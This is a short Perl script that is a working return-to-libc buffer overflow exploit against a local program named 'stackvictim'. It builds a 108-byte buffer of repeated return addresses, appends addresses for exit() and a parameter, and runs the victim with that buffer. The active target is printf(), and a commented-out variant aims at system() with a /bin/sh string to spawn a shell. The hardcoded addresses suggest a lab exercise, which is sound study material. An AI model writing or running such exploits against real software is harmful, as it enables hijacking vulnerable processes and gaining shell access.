#!/usr/bin/perl

$buf = 108;

# system()
#$ret = 0xb7eac7a0;
#$param = 0xbffff858; # pointer to /bin/sh string in environment
#$exit = 0xb7ea1a30;

# printf()
$ret = 0xb7ed35e0;
$param = 0xbffff858;
$exit = 0xb7ea1a30;

$addr = pack('l', $ret);
for ($i = 0; $i < $buf; $i += 4) {
 $buffer .= $addr;
}

$buffer .= pack('l', $exit);
$buffer .= pack('l', $param);

exec("./stackvictim", $buffer, 0);
